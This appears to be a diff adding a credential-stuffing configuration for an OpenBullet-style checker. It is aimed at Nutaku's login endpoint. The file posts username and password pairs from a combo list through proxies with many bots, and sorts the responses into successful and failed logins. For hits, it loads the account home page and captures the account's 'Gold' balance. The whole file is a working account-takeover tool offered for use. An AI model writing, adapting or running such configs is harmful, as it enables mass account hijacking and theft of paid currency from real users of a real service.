@@ -1,0 +1,83 @@
+[SETTINGS]
+{
+  "Name": "Nutaku",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-23T00:09:14.1847509-07:00",
+  "AdditionalInfo": "",
+  "Author": "PureWasHere",
+  "Version": "1.3.5 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Transparent": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.nutaku.net/login/index/ajax" EncodeContent=TRUE 
+  CONTENT "mailAddress=<USER>&password=<PASS>&autoLogin=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.nutaku.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 78" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.nutaku.net" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://www.nutaku.net/home/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorMessage\":\"\",\"errorType\":\"unknown\"," 
+    KEY "" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+
+REQUEST GET "https://www.nutaku.net/home/" 
+  
+  HEADER "Host: www.nutaku.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.nutaku.net/home/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" LR "gold-icon\"></span><span>" "</span></a>" -> CAP "Gold: " 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "gold-icon\"></span><span>" 
+
